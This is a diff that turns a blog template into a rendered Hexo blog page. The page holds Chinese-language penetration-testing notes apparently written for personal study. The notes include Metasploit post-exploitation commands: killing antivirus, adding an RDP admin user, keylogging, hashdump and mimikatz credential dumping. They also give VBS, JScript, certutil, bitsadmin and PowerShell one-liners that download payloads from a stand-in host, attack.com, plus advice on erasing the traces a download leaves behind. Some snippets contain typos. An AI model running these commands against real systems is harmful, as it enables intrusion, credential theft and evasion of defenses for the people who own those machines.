@@ -1,20 +1,601 @@
-{% extends '_layout.njk' %}
-{% import '_macro/sidebar.njk' as sidebar_template with context %}
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
 
-{% block title %}{{ title }}{% if theme.index_with_subtitle and subtitle %} - {{ subtitle }}{% endif %}{% endblock %}
+  
+  <title>GNWING&#39;s BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="GNWING&#39;s BLOG">
+<meta property="og:url" content="https://gnwing.github.io/page/2/index.html">
+<meta property="og:site_name" content="GNWING&#39;s BLOG">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="GNWING&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-{% block class %}index posts-expand{% endblock %}
+<meta name="generator" content="Hexo 4.2.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">GNWING&#39;s BLOG</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://gnwing.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-msf使用指南" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/10/msf%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="article-date">
+  <time datetime="2022-01-10T10:42:25.178Z" itemprop="datePublished">2022-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/10/msf%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">msf使用指南</a>
+    </h1>
+  
 
-  {%- for post in page.posts.toArray() %}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-  {%- endfor %}
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="msf使用指南"><a href="#msf使用指南" class="headerlink" title="msf使用指南"></a>msf使用指南</h2><p>1、常用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--list payload		#查看所有payloads</span><br></pre></td></tr></table></figure>
 
-  {%- include '_partials/pagination.njk' -%}
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encodes		#可查看所有编码器</span><br></pre></td></tr></table></figure>
 
-{% endblock %}
+<p>防止假session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi&#x2F;handler)&gt; set ExitOnSession false		#可以在接收到session后继续监听端口，保持监听</span><br></pre></td></tr></table></figure>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+<p>防止session意外退出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi&#x2F;handler)&gt; set SessionCommunicationTimeout 0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exoloit(multi&#x2F;handler)&gt; set SessionExpirationTimeout 0</span><br></pre></td></tr></table></figure>
+
+<p>handler后台持续监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi&#x2F;handler)&gt; exploit -j -z		#-j为后台任务，-z为持续监听</span><br></pre></td></tr></table></figure>
+
+<p>关闭防病毒软件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run killav</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure>
+
+<p>操作远程桌面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp username&#x3D;test password&#x3D;test	#添加远程桌面的用户（同时也会将该用户添加到管理员组）</span><br></pre></td></tr></table></figure>
+
+<p>键盘记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start		#开启键盘记录功能</span><br><span class="line">keyscan_dump		#显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop		#停止键盘记录功能</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>2、会话持久化</p>
+<ul>
+<li><p>进程的迁移</p>
+<p>查看当前shell的进程</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br></pre></td></tr></table></figure>
+
+<p>​        查看目标进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>
+
+<p>​        获取到目标进程的pid，将shell的进程变为对应的进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate xxx(目标进程pid)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>使用espia</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use espia</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>3、获取凭证</p>
+<ul>
+<li>使用meterpreter的run hashdump 命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>使用mimikatz</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz		#载入模块</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; wdigest		#获取登陆过的用户存储在内存里的明文密码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>4、操作文件系统</p>
+<ul>
+<li>文件的基本操作</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls		#列出当前路径下的所有文件和文件夹</span><br><span class="line">pwd 或 getwd		#查看当前路径</span><br><span class="line">search		#搜索文件，使用search -h查看帮助</span><br><span class="line">cat		#查看文件内容，比如cat test.txt</span><br><span class="line">edit		#编辑或创建文件。和linux系统的vm命令类似，同样适用于windows</span><br><span class="line">rm		#删除文件</span><br><span class="line">cd		#切换路径</span><br><span class="line">mkdir		#创建文件夹</span><br><span class="line">rmdir		#删除文件夹</span><br><span class="line">getlwd 或 lpwd		#查看自己系统的当前路径</span><br><span class="line">lcd			#切换自己当前系统的目录</span><br><span class="line">lls		#显示自己当前系统的所有文件和文件夹</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>文件的上传和下载</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload</span><br><span class="line">download</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2022/01/10/msf%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" data-id="cky8k3eda000ce8ok5q7o8ap7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/10/test/" class="article-date">
+  <time datetime="2022-01-10T10:42:25.178Z" itemprop="datePublished">2022-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/10/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><ul>
+<li>hello test!</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2022/01/10/test/" data-id="cky8k3edb000de8okfgui1wxv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-windows平台paylaod下载" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/10/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/" class="article-date">
+  <time datetime="2022-01-10T10:42:25.178Z" itemprop="datePublished">2022-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/10/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/">windows平台paylaod下载</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="windows平台下paylaod下载"><a href="#windows平台下paylaod下载" class="headerlink" title="windows平台下paylaod下载"></a>windows平台下paylaod下载</h2><blockquote>
+<p>使用vbs下载payload</p>
+</blockquote>
+<p>保存为downfile.vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> a=creatobject(<span class="string">"adod"</span>+<span class="string">"b.stream"</span>):<span class="keyword">set</span> w=creatobject(<span class="string">"micro"</span>+<span class="string">"soft.xmlhttp"</span>):w.open<span class="string">"get"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>命令行下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript downfile.vbs http:&#x2F;&#x2F;attack.com&#x2F;rebots.txt C:\TMP\b.txt</span><br></pre></td></tr></table></figure>
+
+<p>通常在windows上，用echo方法来写入vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set  w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(  0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p>当不能使用参数时，用一个完整的vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL = <span class="string">"http://attack.com/robots.txt"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\test\logo.txt"</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="built_in">CreateObject</span>(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"><span class="keyword">If</span> objXMLHTTP.Status = <span class="number">200</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = <span class="number">1</span></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody </span><br><span class="line">objADOStream.Position = <span class="number">0</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">If</span> objFSO.Fileexists(strHDLocation) <span class="keyword">Then</span> objFSO.DeleteFile strHDLocati <span class="keyword">on</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="literal">Nothing</span></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>使用js一句话下载payload</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScirpt.Arguments(<span class="number">0</span>),<span class="comment">/*async=*false);</span></span><br><span class="line"><span class="comment">WinHttpReq.Send();</span></span><br><span class="line"><span class="comment">WScript.Echo(WinHttpReq.ResponseText);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScript.Arguments(<span class="number">0</span>),<span class="comment">/*async*/</span><span class="literal">false</span>);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</span><br><span class="line">BinStream.Type = <span class="number">1</span>;</span><br><span class="line">BinStream.Open();</span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(<span class="string">"micropoor.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript &#x2F;nologo downfile.js http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用certutil.exe下载payload</p>
+<p>certutil.exe是一个命令行程序，作为证书服务的一部分安装</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>默认下载为bin文件，但是不影响在命令行下使用</p>
+<p>certutil.exe下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次 下载后，需要马上执行如下： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cetutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt delete</span><br></pre></td></tr></table></figure>
+
+<p>certutil还可以加解密</p>
+<blockquote>
+<p>使用ftp下载payload</p>
+</blockquote>
+<p>ftp文件的传输方式：</p>
+<ul>
+<li>Binary：二进制传输</li>
+<li>Ascii：ascII传输</li>
+</ul>
+<p>在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password </span><br><span class="line">echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式 </span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用BITSAdmin下载paylaod</p>
+</blockquote>
+<p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度</p>
+<p>自windows7 以上把呢不能内置bitsadmin，可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有者不错的性能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot; C:\TMP\robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果需要下载过大的文件，需要提高提高优先级。配合上面的下载命令。再次执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;setpriority down foregroup</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用powershell下载payload</p>
+</blockquote>
+<p>靶机win7，Powershell2.0</p>
+<p>down.ps1，基于System.Net.WebClient</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\TMP\&quot;</span><br><span class="line">ForEach($item in $Urls)&#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item,$file)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>靶机windows2012，Powershell大于3.0</p>
+<p>在Powershell 3.0以后，提供wget功能，既Invoke-WebRequest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$output &#x3D; &quot;C:\TMP\robots.txt&quot;</span><br><span class="line">$start_time &#x3D; Get-Date</span><br><span class="line">$Invoke-WebRequest-Uri $url-OutFile $output</span><br><span class="line">Write-Output &quot;Times:$((Get-Date).Subtract($start_time).Seconds) second(s)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一句话下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&#39;,&#39;C:\TMP\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2022/01/10/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/" data-id="cky8k3edk000ne8okbkxb7wlc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-攻击FTP服务" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/10/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/" class="article-date">
+  <time datetime="2022-01-10T10:42:25.178Z" itemprop="datePublished">2022-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/10/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/">攻击FTP服务</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="攻击FTP服务"><a href="#攻击FTP服务" class="headerlink" title="攻击FTP服务"></a>攻击FTP服务</h2><p>msf模块</p>
+<ul>
+<li>auxiliary/scanner/ftp/ftp_version</li>
+<li>auxiliary/scanner/ftp/ftp_login</li>
+<li>auxiliary/scanner/ftp/anonymous</li>
+<li>db_nmap -sS -T4 -p21 192.168.1.115</li>
+</ul>
+<p>ftp本地模糊测试辅助模块：</p>
+<ul>
+<li>auxiliary/fuzzers/ftp/ftp_pre_post</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2022/01/10/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/" data-id="cky8k3edl000pe8okcyn72u36" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-test20220109" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/09/test20220109/" class="article-date">
+  <time datetime="2022-01-09T22:27:33.000Z" itemprop="datePublished">2022-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/09/test20220109/">test20220109</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Trust test fot hexo new post</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2022/01/09/test20220109/" data-id="cky8k3edd000ee8ok4u7whg56" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/22/hello-world/" class="article-date">
+  <time datetime="2014-12-22T12:39:04.000Z" itemprop="datePublished">2014-12-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/gnwing/">gnwing</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/22/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/22/hello-world/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gnwing.github.io/2014/12/22/hello-world/" data-id="cky8k3ed00008e8ok5znmaqkq" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gnwing/" rel="tag">gnwing</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/gnwing/">gnwing</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/gnwing/" rel="tag">gnwing</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/gnwing/" style="font-size: 10px;">gnwing</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/10/test5/">test5</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/10/test4/">test4</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/10/test3/">test3</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/10/DIRB%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">DIRB使用指南</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/10/MSF%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/">MSF主机发现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
